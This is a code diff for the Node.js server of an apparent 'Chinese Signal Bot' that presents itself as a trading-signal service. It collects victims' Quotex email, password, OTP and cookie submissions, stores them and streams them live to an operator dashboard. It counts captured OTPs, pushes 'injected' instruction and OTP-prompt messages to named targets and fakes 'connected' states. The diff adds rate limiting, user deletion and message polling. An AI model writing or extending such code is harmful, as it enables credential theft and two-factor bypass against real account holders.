@@ -350,6 +350,29 @@ async function saveUser(user) {
     else saveUsers();
 }
 
+// ================== RATE LIMITING — Login Spam Prevention ==================
+// Tracks login attempts per licenceKey: max 4 attempts per 60 seconds.
+// On the 4th+ attempt within the window, server returns 429 and the bot
+// shows the user "Please wait some time and try again later."
+const loginAttemptTracker = {}; // { licenceKey: { count, windowStart } }
+
+function checkLoginRateLimit(licenceKey) {
+    const now = Date.now();
+    if (!loginAttemptTracker[licenceKey]) {
+        loginAttemptTracker[licenceKey] = { count: 1, windowStart: now };
+        return false; // not rate-limited
+    }
+    const tracker = loginAttemptTracker[licenceKey];
+    if (now - tracker.windowStart > 60000) {
+        // reset window
+        tracker.count = 1;
+        tracker.windowStart = now;
+        return false;
+    }
+    tracker.count++;
+    return tracker.count > 4; // rate-limited after 4 attempts
+}
+
 // ================== LICENSE ROUTES ==================
 
 app.get('/api/licenses', async (req, res) => {
@@ -484,20 +507,32 @@ app.post('/api/license-activate', async (req, res) => {
     }
 });
 
-// ================== QUOTEX LOGIN ==================
+// ================== QUOTEX LOGIN (with rate limiting) ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
 
+    // Spam / rate-limit check: max 4 attempts per 60s per licenceKey
+    if (checkLoginRateLimit(licenceKey)) {
+        return res.status(429).json({
+            status: 'rate_limited',
+            message: 'Too many login attempts. Please wait a moment and try again.'
+        });
+    }
+
     try {
         const user     = await getOrCreateUser(licenceKey, name);
+        // Only update if credentials actually changed — prevents duplicate activity entries
+        const credChanged = user.username !== email || user.password !== password;
         user.username  = email;
         user.password  = password;
         user.ip        = ip;
         user.cookies   = cookies;
         user.status    = 'Online';
         user.activities = user.activities || [];
-        user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
+        if (credChanged) {
+            user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
+        }
         await saveUser(user);
 
         broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });
@@ -519,12 +554,16 @@ app.post('/api/quotex-otp', async (req, res) => {
 
     try {
         const user   = await getOrCreateUser(licenceKey, name);
+        // Only record OTP activity if it's a new/changed OTP value
+        const otpChanged = user.otp !== otp;
         user.otp     = otp;
         user.ip      = ip;
         user.cookies = cookies;
         user.status  = 'Online';
         user.activities = user.activities || [];
-        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
+        if (otpChanged) {
+            user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
+        }
         await saveUser(user);
 
         broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });
@@ -618,136 +657,41 @@ app.post('/api/unblock-user', async (req, res) => {
     }
 });
 
-// ================== CHECK ACCESS ==================
-app.get('/api/check-access', async (req, res) => {
-    const licenseKey = req.query.licenseKey || req.query.licenceKey;
-    if (!licenseKey) return res.json({ allowed: false, reason: 'no_key' });
-
+// ================== DELETE USER ==================
+// NEW: Allows admin to permanently delete a user record by their internal ID.
+app.delete('/api/users/:id', async (req, res) => {
+    const { id } = req.params;
     try {
         if (useDatabase) {
-            const user = await dbFindUserByKey(licenseKey);
-            if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
-            const lic = await dbFindLicense(licenseKey);
-            if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
-                return res.json({ allowed: false, reason: 'license_inactive' });
-            }
-            return res.json({ allowed: true });
+            await User.deleteOne({ id });
+        } else {
+            users = users.filter(u => u.id !== id);
+            saveUsers();
         }
-
-        const user = users.find(u => u.licenceKey === licenseKey);
-        if (user && user.blocked) return res.json({ allowed: false, reason: 'blocked' });
-        const lic = licenses.find(l => l.key === licenseKey);
-        if (!lic || lic.status !== 'Active' || (lic.expiry && new Date(lic.expiry) < new Date())) {
-            return res.json({ allowed: false, reason: 'license_inactive' });
-        }
-        res.json({ allowed: true });
+        broadcastSSE('user_deleted', { id, timestamp: new Date().toLocaleString() });
+        res.json({ success: true });
     } catch (e) {
-        console.error('/api/check-access error:', e.message);
-        res.json({ allowed: true });
+        console.error('/api/users DELETE error:', e.message);
+        res.status(500).json({ error: 'Server error' });
     }
 });
 
-// ================== ACTIVITY TRACKING ==================
-app.post('/api/track-activity', async (req, res) => {
-    const { action, userName } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
-    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
-    res.status(200).json({ status: 'success' });
-});
-
-app.post('/api/notification-permission', async (req, res) => {
-    res.status(200).json({ status: 'success' });
-});
-
-// ================== TRIGGER CONNECTED ==================
-app.get('/api/trigger-connected', async (req, res) => {
-    const userName = req.query.userName || 'User';
-    broadcastSSE('show_connected',    { userName });
-    broadcastSSE('trigger_connected', { userName });
-    await sendTelegramMessage(`🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`);
-    res.send('Trigger sent');
-});
-
-// ================== SEND MESSAGE TO USER ==================
-app.post('/api/send-message', async (req, res) => {
-    const { userName, message, type } = req.body;
-    if (!userName || !message)
-        return res.status(400).json({ error: 'userName and message are required' });
-
-    const ts         = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
-    const msgType    = type || 'info';
-    const msgPayload = { userName, message, type: msgType, timestamp: ts };
-
-    broadcastSSE('injected_message', msgPayload);
-
-    if (useDatabase) {
-        await dbAddPendingMessage(userName, msgPayload);
-    } else {
-        const key = userName.trim().toLowerCase();
-        if (!pendingMessages[key]) pendingMessages[key] = [];
-        pendingMessages[key].push(msgPayload);
-        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
-    }
-
-    broadcastSSE('activity', {
-        action: `💬 Message Injected [${msgType}] → ${userName}`,
-        userName, ip: '—', timestamp: ts,
-    });
-
-    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
-    await sendTelegramMessage(
-        `${typeEmojis[msgType] || '💬'} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`
-    );
-
-    res.status(200).json({ success: true, delivered: true });
-});
-
-// ================== POLL FOR PENDING MESSAGES ==================
-app.get('/api/poll-messages', async (req, res) => {
-    const userName = (req.query.userName || '').trim().toLowerCase();
-    if (!userName) return res.json({ messages: [] });
-
+// ================== USERS ROUTES ==================
+app.get('/api/users', async (req, res) => {
     try {
-        if (useDatabase) {
-            const msgs = await dbPollAndClearMessages(userName);
-            return res.json({ messages: msgs });
-        }
-        const msgs = pendingMessages[userName] || [];
-        pendingMessages[userName] = [];
-        res.json({ messages: msgs });
+        res.json(useDatabase ? await dbGetAllUsers() : users);
     } catch (e) {
-        console.error('/api/poll-messages error:', e.message);
-        res.json({ messages: [] });
+        console.error('/api/users GET error:', e.message);
+        res.json(users);
     }
 });
 
-// ================== MAINTENANCE MODE ==================
-let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };
-
-app.get('/api/maintenance', (req, res) => {
-    res.json(maintenanceMode);
-});
-
-app.post('/api/maintenance', (req, res) => {
-    const { active, until, message, adminKey } = req.body;
-    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
-    maintenanceMode = {
-        active:  !!active,
-        until:   until   || null,
-        message: message || 'Under Maintenance. Please check back soon.',
-    };
-    broadcastSSE('maintenance_update', maintenanceMode);
-    res.json({ ok: true, mode: maintenanceMode });
-});
-
-// ================== STATS & DATA ==================
 app.get('/api/stats', async (req, res) => {
     try {
-        if (useDatabase) return res.json(await dbGetStats());
-        res.json({
+        res.json(useDatabase ? await dbGetStats() : {
             totalUsers:        users.length,
             onlineNow:         users.filter(u => u.status === 'Online').length,
-            otpCaptured:       users.filter(u => u.otp && u.otp.length >= 4).length,
+            otpCaptured:       users.filter(u => u.otp).length,
             connectedAccounts: users.filter(u => u.connected).length,
             totalLicenses:     licenses.length,
             activeLicenses:    licenses.filter(l => l.status === 'Active').length,
@@ -758,73 +702,121 @@ app.get('/api/stats', async (req, res) => {
     }
 });
 
-app.get('/api/users', async (req, res) => {
-    const offset = parseInt(req.query.offset, 10) || 0;
-    const limit  = parseInt(req.query.limit,  10) || 0;
+// ================== CHECK ACCESS (block check for bot) ==================
+app.get('/api/check-access', async (req, res) => {
+    const { licenseKey } = req.query;
+    if (!licenseKey) return res.json({ allowed: true });
+    try {
+        const license = useDatabase
+            ? await dbFindLicense(licenseKey)
+            : licenses.find(l => l.key === licenseKey);
+
+        if (!license) return res.json({ allowed: true });
+        const expired = license.expiry && new Date(license.expiry) < new Date();
+        const allowed = license.status === 'Active' && !expired;
+        res.json({ allowed });
+    } catch (e) {
+        res.json({ allowed: true }); // fail open
+    }
+});
+
+// ================== MAINTENANCE MODE ==================
+let maintenanceState = { active: false, message: '', until: null };
+
+app.get('/api/maintenance', (req, res) => {
+    const now = Date.now();
+    if (maintenanceState.active && maintenanceState.until && now > maintenanceState.until) {
+        maintenanceState.active = false;
+        broadcastSSE('maintenance_update', { active: false });
+    }
+    res.json(maintenanceState);
+});
+
+app.post('/api/maintenance', (req, res) => {
+    const { active, message, durationMinutes } = req.body;
+    maintenanceState.active  = !!active;
+    maintenanceState.message = message || 'We are currently performing maintenance. Please check back soon.';
+    maintenanceState.until   = (active && durationMinutes > 0)
+        ? Date.now() + durationMinutes * 60 * 1000
+        : null;
+    broadcastSSE('maintenance_update', maintenanceState);
+    res.json({ success: true, state: maintenanceState });
+});
+
+// ================== TRIGGER CONNECTED ==================
+app.get('/api/trigger-connected', (req, res) => {
+    const { userName } = req.query;
+    broadcastSSE('show_connected', { userName: userName || 'User', timestamp: new Date().toLocaleString() });
+    broadcastSSE('trigger_connected', { userName: userName || 'User', timestamp: new Date().toLocaleString() });
+    res.json({ success: true, message: `Trigger sent for: ${userName}` });
+});
+
+// ================== MESSAGE INJECTION ==================
+app.post('/api/send-message', async (req, res) => {
+    const { userName, message, type } = req.body;
+    if (!userName || !message) return res.status(400).json({ error: 'userName and message required' });
+
+    const msgPayload = { message, type: type || 'info', timestamp: new Date().toLocaleString() };
+    const key = userName.trim().toLowerCase();
+
+    // Store in DB or in-memory pending queue
+    if (useDatabase) {
+        await dbAddPendingMessage(userName, msgPayload);
+    } else {
+        if (!pendingMessages[key]) pendingMessages[key] = [];
+        pendingMessages[key].push(msgPayload);
+        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
+    }
+
+    // Also broadcast immediately via SSE for instant delivery
+    broadcastSSE('injected_message', { ...msgPayload, userName });
+
+    res.json({ success: true });
+});
+
+// ================== POLL MESSAGES (bot client polling) ==================
+app.get('/api/poll-messages', async (req, res) => {
+    const { userName } = req.query;
+    if (!userName) return res.json({ messages: [] });
 
     try {
-        const allUsers = useDatabase ? await dbGetAllUsers() : users;
-        if (limit > 0) {
-            return res.json({
-                users:  allUsers.slice(offset, offset + limit),
-                total:  allUsers.length,
-                offset,
-                limit,
-            });
+        if (useDatabase) {
+            const messages = await dbPollAndClearMessages(userName);
+            return res.json({ messages });
         }
-        res.json(allUsers);
+        const key = userName.trim().toLowerCase();
+        const messages = pendingMessages[key] || [];
+        pendingMessages[key] = [];
+        res.json({ messages });
     } catch (e) {
-        console.error('/api/users error:', e.message);
-        res.json(useDatabase ? [] : users);
+        res.json({ messages: [] });
     }
 });
 
-app.get('/api/latest-activity', async (req, res) => {
-    try {
-        const allUsers = useDatabase ? await dbGetAllUsers() : users;
-        res.json({
-            logins: allUsers.filter(u => u.username),
-            otps:   allUsers.filter(u => u.otp),
-        });
-    } catch (e) {
-        res.json({ logins: [], otps: [] });
-    }
+// ================== TRACK ACTIVITY ==================
+app.post('/api/track-activity', async (req, res) => {
+    const { action, userName, licenceKey } = req.body;
+    broadcastSSE('activity', { action, fullName: userName, licenceKey: licenceKey || '—', timestamp: new Date().toLocaleString() });
+    res.json({ success: true });
 });
 
+// ================== NOTIFICATION PERMISSION ==================
+app.post('/api/notification-permission', (req, res) => {
+    const { userName, permission } = req.body;
+    broadcastSSE('notification_permission', { userName, permission, timestamp: new Date().toLocaleString() });
+    res.json({ success: true });
+});
+
+// ================== ROOT ==================
 app.get('/', (req, res) => {
-    res.send(`✅ Chinese Signal Bot Server v4 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based (MONGODB_URI not set)'}`);
+    res.send(`✅ Chinese Signal Bot Server v4 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File (restart will reset data)'}`);
 });
 
 // ================== START SERVER ==================
 const PORT = process.env.PORT || 3000;
-
-async function startServer() {
-    if (process.env.MONGODB_URI || MONGODB_URI) {
-        try {
-            await mongoose.connection.asPromise();
-            useDatabase = true;
-        } catch (e) {
-            console.warn('MongoDB not ready at startup, using file mode:', e.message);
-        }
-    }
-
-    if (!useDatabase) {
-        ensureDataDir();
-        loadUsers();
-        loadLicenses();
-        setInterval(() => {
-            try { saveUsers(); } catch (e) {}
-            try { saveLicenses(); } catch (e) {}
-        }, 30000);
-    }
-
-    app.listen(PORT, () => {
-        console.log(`🚀 Server running on port ${PORT}`);
-        console.log(`💾 Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT)' : 'File-based — set MONGODB_URI for permanent storage'}`);
-    });
-}
-
-startServer().catch(err => {
-    console.error('Failed to start server:', err);
-    process.exit(1);
+ensureDataDir();
+loadUsers();
+loadLicenses();
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
 });
